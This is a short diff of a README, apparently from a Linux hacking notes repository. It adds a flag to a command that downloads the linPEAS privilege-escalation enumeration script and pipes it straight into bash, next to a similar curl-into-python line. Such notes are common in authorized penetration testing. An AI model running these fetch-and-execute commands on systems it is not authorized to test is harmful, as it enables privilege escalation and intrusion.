@@ -8,7 +8,7 @@ python <(curl -s https://raw.githubusercontent.com/tav-r/Linux-hacks/main/filele
 ```
 of course this is pointless since you could also just run
 ```bash
-bash <(curl -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+bash <(curl -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) -a
 ```
 but maybe something like this?
 ```bash
